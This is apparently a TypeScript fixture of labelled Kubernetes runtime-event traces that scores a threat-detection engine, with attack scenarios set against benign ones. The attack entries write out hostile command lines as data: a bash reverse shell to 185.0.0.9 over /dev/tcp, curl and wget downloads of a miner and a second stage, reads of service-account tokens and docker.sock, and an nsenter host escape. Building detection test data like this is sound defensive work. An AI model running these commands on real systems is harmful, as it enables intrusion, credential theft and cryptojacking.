import type { RuntimeEvent, Scenario } from './types.ts';

// Labeled runtime-event traces. Attack traces are emitted by the matching
// emulation scripts in attack/; benign traces are the kind of activity a real
// cluster produces all day. The detection engine is scored against both.

const APP = { pod: 'telemetry-api-7c9f-abcde', namespace: 'production', container: 'api', image: 'registry.enclave.local/telemetry-api:4.2.0' };
const ev = (ts: number, e: Partial<RuntimeEvent> & { kind: RuntimeEvent['kind'] }): RuntimeEvent => ({ ...APP, ...e, ts });

export const SCENARIOS: Scenario[] = [
  {
    id: 'escape', title: 'Privileged pod → host escape', kind: 'attack', techniques: ['T1610', 'T1611', 'T1548'],
    blurb: 'A pod admitted with privileged=true spawns a shell and uses nsenter to break into the host PID namespace — the classic container escape.',
    events: [
      ev(0, { kind: 'process', proc: 'api', exe: '/app/api', parent: 'tini', privileged: true }),
      ev(1200, { kind: 'process', proc: 'bash', exe: '/bin/bash', parent: 'api', user: 'root', uid: 0, privileged: true }),
      ev(1800, { kind: 'process', proc: 'nsenter', exe: '/usr/bin/nsenter', args: '-t 1 -m -u -i -n -p -- /bin/bash', parent: 'bash', privileged: true, hostPid: true }),
    ],
  },
  {
    id: 'sa-theft', title: 'Service-account token theft → API recon', kind: 'attack', techniques: ['T1552.007', 'T1552', 'T1078'],
    blurb: 'An attacker in a pod reads the mounted SA token with curl, connects straight to the apiserver, and the SA then lists secrets cluster-wide.',
    events: [
      ev(0, { kind: 'process', proc: 'sh', exe: '/bin/sh', parent: 'api' }),
      ev(900, { kind: 'file', proc: 'curl', path: '/var/run/secrets/kubernetes.io/serviceaccount/token', flags: 'O_RDONLY' }),
      ev(1400, { kind: 'network', proc: 'curl', direction: 'outbound', dstName: 'kubernetes.default', dstPort: 443 }),
      ev(2600, { kind: 'k8s_audit', verb: 'list', resource: 'secrets', apiUser: 'system:serviceaccount:production:telemetry-api' }),
    ],
  },
  {
    id: 'cryptomining', title: 'Crypto-miner payload', kind: 'attack', techniques: ['T1105', 'T1496', 'T1071'],
    blurb: 'A compromised pod pulls a miner with curl and runs xmrig against a stratum pool — the most common opportunistic cluster payload.',
    events: [
      ev(0, { kind: 'process', proc: 'curl', parent: 'sh', args: '-o /tmp/x http://185.0.0.9/xmrig' }),
      ev(700, { kind: 'process', proc: 'xmrig', exe: '/tmp/x', parent: 'sh', args: '-o stratum+tcp://pool.min.xyz:4444 -u wallet' }),
      ev(1100, { kind: 'network', proc: 'xmrig', direction: 'outbound', dstIp: '185.0.0.9', dstPort: 4444 }),
    ],
  },
  {
    id: 'revshell', title: 'Reverse shell from web pod', kind: 'attack', techniques: ['T1059', 'T1071'],
    blurb: 'Exploited web process drops a bash reverse shell back to the attacker over /dev/tcp.',
    events: [
      ev(0, { kind: 'process', proc: 'sh', parent: 'nginx', args: '-c id' }),
      ev(600, { kind: 'process', proc: 'bash', parent: 'sh', args: '-i >& /dev/tcp/185.0.0.9/4444 0>&1' }),
      ev(900, { kind: 'network', proc: 'bash', direction: 'outbound', dstIp: '185.0.0.9', dstPort: 4444 }),
    ],
  },
  {
    id: 'dangerous-mount', title: 'Escape via docker.sock mount', kind: 'attack', techniques: ['T1611', 'T1613'],
    blurb: 'A pod with the host Docker socket mounted reads it and host /proc — the mounted-socket path to node takeover.',
    events: [
      ev(0, { kind: 'process', proc: 'sh', parent: 'api' }),
      ev(500, { kind: 'file', proc: 'cat', path: '/var/run/docker.sock', flags: 'O_RDONLY' }),
      ev(1200, { kind: 'file', proc: 'cat', path: '/host/proc/1/environ', flags: 'O_RDONLY' }),
    ],
  },
  {
    id: 'persistence', title: 'Cron persistence + tool transfer', kind: 'attack', techniques: ['T1105', 'T1053'],
    blurb: 'Attacker downloads a second stage and writes a cron job for persistence inside the container.',
    events: [
      ev(0, { kind: 'process', proc: 'wget', parent: 'bash', args: 'http://185.0.0.9/stage2 -o /tmp/s2' }),
      ev(800, { kind: 'file', proc: 'bash', path: '/etc/cron.d/backdoor', flags: 'O_WRONLY|O_CREAT' }),
    ],
  },
  {
    id: 'rogue-exec', title: 'Off-hours exec by service account', kind: 'attack', techniques: ['T1059', 'T1021', 'T1078'],
    blurb: 'A stolen SA (not a human operator) execs into a pod and immediately spawns a package manager to tool up.',
    events: [
      ev(0, { kind: 'k8s_audit', verb: 'create', resource: 'pods', subresource: 'exec', apiUser: 'system:serviceaccount:production:ci-runner' }),
      ev(1500, { kind: 'process', proc: 'apk', parent: 'sh', args: 'add socat' }),
    ],
  },

  // -------- benign traffic (should not page) --------
  {
    id: 'rollout', title: 'Normal app rollout', kind: 'benign',
    blurb: 'A healthy deployment: the app starts under tini, reads its own config, serves traffic and talks to its database. No shells, no escapes.',
    events: [
      ev(0, { kind: 'process', proc: 'api', exe: '/app/api', parent: 'tini' }),
      ev(50, { kind: 'file', proc: 'api', path: '/app/config/settings.yaml', flags: 'O_RDONLY' }),
      ev(120, { kind: 'network', proc: 'api', direction: 'outbound', dstName: 'postgres.production', dstPort: 5432 }),
      ev(200, { kind: 'network', proc: 'api', direction: 'inbound', dstPort: 8080 }),
    ],
  },
  {
    id: 'sdk-token', title: 'App uses its SA token via the SDK', kind: 'benign',
    blurb: 'The app\'s own binary reads the SA token and calls the apiserver through the client SDK — legitimate in-cluster API use, must not page.',
    events: [
      ev(0, { kind: 'process', proc: 'api', exe: '/app/api', parent: 'tini' }),
      ev(300, { kind: 'file', proc: 'api', path: '/var/run/secrets/kubernetes.io/serviceaccount/token', flags: 'O_RDONLY' }),
      ev(360, { kind: 'network', proc: 'api', direction: 'outbound', dstName: 'kubernetes.default', dstPort: 443 }),
    ],
  },
  {
    id: 'operator-exec', title: 'On-call operator debugs a pod', kind: 'benign',
    blurb: 'A named human operator kubectl-execs a shell during a change window. This raises baseline notices (shell, exec) but should not page.',
    events: [
      ev(0, { kind: 'k8s_audit', verb: 'create', resource: 'pods', subresource: 'exec', apiUser: 'okafor@enclave.mil' }),
      ev(400, { kind: 'process', proc: 'bash', parent: 'runc', user: 'app', uid: 1000 }),
      ev(1500, { kind: 'process', proc: 'cat', parent: 'bash', args: '/app/logs/app.log' }),
    ],
  },
  {
    id: 'ci-build', title: 'CI image build in build namespace', kind: 'benign',
    blurb: 'A CI job in the ci namespace runs apk/pip to build an image. Expected drift signal in CI (a notice), not a production IOC.',
    events: [
      ev(0, { kind: 'process', proc: 'apk', parent: 'sh', namespace: 'ci', pod: 'kaniko-build-xyz', args: 'add --no-cache ca-certificates' }),
      ev(900, { kind: 'process', proc: 'pip3', parent: 'sh', namespace: 'ci', pod: 'kaniko-build-xyz', args: 'install -r requirements.txt' }),
    ],
  },
  {
    id: 'sidecar', title: 'Service-mesh sidecar traffic', kind: 'benign',
    blurb: 'An Envoy sidecar proxies app traffic and scrapes metrics. High connection volume, zero IOCs.',
    events: [
      ev(0, { kind: 'process', proc: 'envoy', exe: '/usr/local/bin/envoy', parent: 'pilot-agent', container: 'istio-proxy' }),
      ev(100, { kind: 'network', proc: 'envoy', direction: 'outbound', dstName: 'telemetry-api.production', dstPort: 8080, container: 'istio-proxy' }),
      ev(200, { kind: 'network', proc: 'envoy', direction: 'inbound', dstPort: 15090, container: 'istio-proxy' }),
    ],
  },
];
